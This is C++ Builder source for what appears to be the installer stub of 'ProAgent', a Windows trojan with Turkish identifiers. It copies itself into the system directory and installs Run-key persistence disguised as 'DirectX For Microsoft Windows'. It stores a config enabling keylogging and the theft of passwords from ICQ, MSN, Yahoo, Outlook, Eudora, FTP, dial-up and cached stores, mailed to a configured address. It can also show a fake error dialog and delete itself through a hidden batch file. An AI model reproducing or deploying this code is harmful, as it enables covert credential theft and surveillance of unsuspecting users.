/*===================================
ProAgent coded By ATmaCA
http://www.atmacasoft.com
atmaca@prohack.net
===================================*/
//---------------------------------------------------------------------------

#include <vcl.h>
#include <tlhelp32.h>
#include "stdio.h"
#include "Registry.hpp"
#pragma hdrstop

#include "Unit2.h"
#include "Unit1.h"

//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TForm2 *Form2;
AnsiString Abook_atm,Adet_atm,cached_atm,Eudora_atm,Ftp_atm,KeyLog_atm,Kurban_atm,MailTo_atm,Mirabilis2003a_atm,
           Mirabilis98_atm,Miranda_atm,MsnMessenger_atm,Outlook_atm,PcInfo_atm,Processes_atm,Ras_atm,Smtp_atm,
           Ss_atm,Trillian_atm,UrlInfo_atm,Yahoo_atm,hatamesaj_atm,hatabaslik_atm,hataicon_atm,hatabuton_atm,hatakont_atm;
int hata_buton,hata_icon;
bool process_kontrol(AnsiString exe)
{
bool sayi=false;
HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if(hSnapShot == INVALID_HANDLE_VALUE)
		{
				return false;
		}
		PROCESSENTRY32 procentry;
		HANDLE pr;
		procentry.dwSize = sizeof(PROCESSENTRY32);
		BOOL F = Process32First( hSnapShot, &procentry );

		while (F)
		{

			       //	if(strstr(procentry.szExeFile,av[i])!=0)
                                if(LowerCase(ExtractFileName(procentry.szExeFile))==LowerCase(ExtractFileName(exe)))
                                sayi=true;

		//Memo1->Lines->Add( procentry.szExeFile );
		procentry.dwSize = sizeof(PROCESSENTRY32);
		F = Process32Next( hSnapShot, &procentry );
		}
	CloseHandle(hSnapShot);
        return sayi;
}
void Kendini_Sil()
                  {
                    char kendi_ismi[MAX_PATH];
                    char kendi_ismi2[MAX_PATH];
                    char r='"';
                    char k='%';
                    GetModuleFileName( NULL,kendi_ismi, MAX_PATH) ;
                    strcpy(kendi_ismi2,kendi_ismi);
                    FILE *di;
                    if((di=fopen(strcat(kendi_ismi,".bat"),"w")) == NULL)
                       {
                        return;
                       }
                    fprintf(di,":1\n");
                    fprintf(di,"del %c%s%c\n",r,kendi_ismi2,r);
                    fprintf(di,"if exist  %c%s%c goto 1\n",r,kendi_ismi2,r);
                    fprintf(di,"del %c0\n",k);
                    fclose(di);
                    WinExec(kendi_ismi, SW_HIDE);
   	
                  }
AnsiString Ceviri(AnsiString kelime)
{
//AnsiString cev;
for(int i=0;i<kelime.Length();i++)
    {
      if(kelime.c_str()[i]=='=')
      {
      kelime.c_str()[i]=' ';
      break;
      }
      else
          {
           kelime.c_str()[i]=' ';
          }
    }
return kelime.Trim();
}
//---------------------------------------------------------------------------
__fastcall TForm2::TForm2(TComponent* Owner)
        : TForm(Owner)
{
}
//---------------------------------------------------------------------------

void __fastcall TForm2::FormCreate(TObject *Sender)
{
//===================================================================================================
char path[100];
GetSystemDirectory( path, 100 );
AnsiString Kopya1=AnsiString(path)+"\\dtxservice.exe";
AnsiString Kopya2=AnsiString(path)+"\\dtxservice.exe -atm";
TRegistry& regKey = *new TRegistry();
regKey.RootKey= HKEY_LOCAL_MACHINE;
try
{
regKey.CreateKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run");
regKey.OpenKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run\\",false);
regKey.WriteString("DirectX For Microsoft® Windows",Kopya2);
}
catch(...)
{
}
regKey.CloseKey();
/////// startuptan iyice emin olmak icin ////
try
{
regKey.CreateKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
regKey.OpenKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\",false);
regKey.WriteString("DirectX For Microsoft® Windows",Kopya2);
}
catch(...)
{
}
if(!FileExists(Kopya1))
CopyFile( Application->ExeName.c_str(),Kopya1.c_str(),true );
else
{
if(!process_kontrol(Kopya1))
WinExec(Kopya2.c_str(),SW_SHOW);
exit(1);
}
//===================================================================================================
//================================================================================
AnsiString kSil="kSil_atm=0";
Abook_atm="Abook_atm=1";
Adet_atm="Adet_atm=0               ";
cached_atm="cached_atm=1";
Eudora_atm="Eudora_atm=1";
Ftp_atm="Ftp_atm=1";
KeyLog_atm="KeyLog_atm=1";
Kurban_atm="Kurban_atm=                                                      ";
MailTo_atm="MailTo_atm=                                                      ";
Mirabilis2003a_atm="Mirabilis2003a_atm=1";
Mirabilis98_atm="Mirabilis98_atm=1";
Miranda_atm="Miranda_atm=1";
MsnMessenger_atm="MsnMessenger_atm=1";
Outlook_atm="Outlook_atm=1";
PcInfo_atm="PcInfo_atm=1";
Processes_atm="Processes_atm=1";
Ras_atm="Ras_atm=1";
Smtp_atm="Smtp_atm=                                                          ";
Ss_atm="Ss_atm=0  ";
Trillian_atm="Trillian_atm=1";
UrlInfo_atm="UrlInfo_atm=1";
Yahoo_atm="Yahoo_atm=1";
hatamesaj_atm="hatamesaj_atm=                                                                                                                                                                        ";
hatabaslik_atm="hatabaslik_atm=                                                                                                                                                                      ";
hataicon_atm="hataicon_atm=1";
hatabuton_atm="hatabuton_atm=1";
hatakont_atm="hatakont_atm=1"; //denedikten sonra 0 yap
//================================================================================

TRegistry& regYaz = *new TRegistry();
regYaz.RootKey=HKEY_CURRENT_USER;
regYaz.CreateKey("SOFTWARE\\Microsoft\\Dxdriver\\LocalSettings");
regYaz.OpenKey("SOFTWARE\\Microsoft\\Dxdriver\\LocalSettings\\",false);
regYaz.WriteString("Abook",Ceviri(Abook_atm));
regYaz.WriteString("Adet",Ceviri(Adet_atm));
regYaz.WriteString("cached",Ceviri(cached_atm));
regYaz.WriteString("Eudora",Ceviri(Eudora_atm));
regYaz.WriteString("Ftp",Ceviri(Ftp_atm));
regYaz.WriteString("KeyLog",Ceviri(KeyLog_atm));
regYaz.WriteString("Kurban",Ceviri(Kurban_atm));
regYaz.WriteString("MailTo",Ceviri(MailTo_atm));
regYaz.WriteString("Mirabilis2003a",Ceviri(Mirabilis2003a_atm));
regYaz.WriteString("Mirabilis98",Ceviri(Mirabilis98_atm));
regYaz.WriteString("Miranda",Ceviri(Miranda_atm));
regYaz.WriteString("MsnMessenger",Ceviri(MsnMessenger_atm));
regYaz.WriteString("Outlook",Ceviri(Outlook_atm));
regYaz.WriteString("PcInfo",Ceviri(PcInfo_atm));
regYaz.WriteString("Processes",Ceviri(Processes_atm));
regYaz.WriteString("Ras",Ceviri(Ras_atm));
regYaz.WriteString("Smtp",Ceviri(Smtp_atm));
regYaz.WriteString("Ss",Ceviri(Ss_atm));
regYaz.WriteString("Trillian",Ceviri(Trillian_atm));
regYaz.WriteString("UrlInfo",Ceviri(UrlInfo_atm));
regYaz.WriteString("Yahoo",Ceviri(Yahoo_atm));
if(!process_kontrol(Kopya1))
WinExec(Kopya2.c_str(),SW_SHOW);


AnsiString ned1;
ned1=Ceviri(hataicon_atm);

if(ned1=="0")
hata_icon=0;
if(ned1=="1")
hata_icon=MB_ICONSTOP;
if(ned1=="2")
hata_icon=MB_ICONQUESTION;
if(ned1=="3")
hata_icon=MB_ICONINFORMATION;
if(ned1=="4")
hata_icon=MB_ICONEXCLAMATION;

AnsiString ned2;
ned2=Ceviri(hatabuton_atm);

if(ned2=="1")
hata_buton=MB_OK;
if(ned2=="2")
hata_buton=MB_OKCANCEL;
if(ned2=="3")
hata_buton=MB_YESNO;
if(ned2=="4")
hata_buton=MB_YESNOCANCEL;
if(ned2=="5")
hata_buton=MB_RETRYCANCEL;
if(ned2=="6")
hata_buton=MB_ABORTRETRYIGNORE;


if(Ceviri(hatakont_atm)== "1")
MessageBox(NULL,Ceviri(hatabaslik_atm).c_str(),Ceviri(hatamesaj_atm).c_str(), hata_icon | hata_buton  );

if(Ceviri(kSil)=="1")
Kendini_Sil();
exit(1);
}
//---------------------------------------------------------------------------
